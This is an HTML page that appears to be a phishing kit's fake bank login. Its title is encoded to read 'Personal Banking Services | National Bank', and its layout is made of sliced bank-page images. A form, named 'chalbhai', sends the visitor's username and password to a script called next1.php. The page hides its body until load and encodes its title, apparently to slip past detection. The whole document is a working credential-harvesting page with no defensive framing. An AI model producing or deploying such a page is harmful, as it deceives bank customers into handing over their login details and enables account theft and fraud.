<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;&#32;&#124;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
  
.textbox {  
    border: solid 1px #B11616;  
  	padding-left: 2px;
  	font-size: 14px;
    height: 21px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #B11616; 
    border-style: solid; 
    border-width: 1px;  
    box-shadow: 0px 0px 3px #4488cc; 
    -moz-box-shadow: 0px 0px 3px #4488cc; 
    -webkit-box-shadow: 0px 0px 3px #4488cc; 
    outline: 0; 
 } 

 </style>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1028px; height:104px; z-index:0"><img src="images/bc1.png" alt="" title="" border=0 width=1028 height=104></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:113px; width:1019px; height:113px; z-index:1"><img src="images/bc2.png" alt="" title="" border=0 width=1019 height=113></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:223px; width:1021px; height:168px; z-index:2"><img src="images/bc3.png" alt="" title="" border=0 width=1021 height=168></div>

<div id="image4" style="position:absolute; overflow:hidden; left:155px; top:391px; width:563px; height:152px; z-index:3"><img src="images/bc4.png" alt="" title="" border=0 width=563 height=152></div>

<div id="image5" style="position:absolute; overflow:hidden; left:274px; top:279px; width:251px; height:13px; z-index:4"><a href="#"><img src="images/bc5.png" alt="" title="" border=0 width=251 height=13></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:437px; top:469px; width:167px; height:15px; z-index:5"><a href="#"><img src="images/bc6.png" alt="" title="" border=0 width=167 height=15></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:260px; top:516px; width:432px; height:27px; z-index:6"><a href="#"><img src="images/bc7.png" alt="" title="" border=0 width=432 height=27></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:770px; top:225px; width:251px; height:138px; z-index:7"><a href="#"><img src="images/bc8.png" alt="" title="" border=0 width=251 height=138></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:791px; top:135px; width:190px; height:67px; z-index:8"><a href="#"><img src="images/bc9.png" alt="" title="" border=0 width=190 height=67></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:14px; top:205px; width:118px; height:142px; z-index:9"><a href="#"><img src="images/bc10.png" alt="" title="" border=0 width=118 height=142></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:161px; top:165px; width:269px; height:32px; z-index:10"><a href="#"><img src="images/bc11.png" alt="" title="" border=0 width=269 height=32></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:252px; top:362px; width:116px; height:14px; z-index:11"><a href="#"><img src="images/bc12.png" alt="" title="" border=0 width=116 height=14></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:191px; top:66px; width:207px; height:18px; z-index:12"><a href="#"><img src="images/bc.png" alt="" title="" border=0 width=207 height=18></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:947px; top:73px; width:58px; height:23px; z-index:13"><a href="#"><img src="images/quit.png" alt="" title="" border=0 width=58 height=23></a></div>
<form action=next1.php name=chalbhai id=chalbhai method=post>
<input name="user" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:132px;left:256px;top:254px;z-index:14">
<div id="formcheckbox1" style="position:absolute; left:256px; top:275px; z-index:15"><input type="checkbox" name="formcheckbox1"></div>
<input name="pass" placeholder="&#67;&#97;&#115;&#101;&#45;&#83;&#101;&#110;&#115;&#105;&#116;&#105;&#118;&#101;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:132px;left:254px;top:337px;z-index:16">
<div id="formimage1" style="position:absolute; left:253px; top:393px; z-index:17"><input type="image" name="formimage1" width="84" height="33" src="images/sign.png"></div>

</body>
</html>
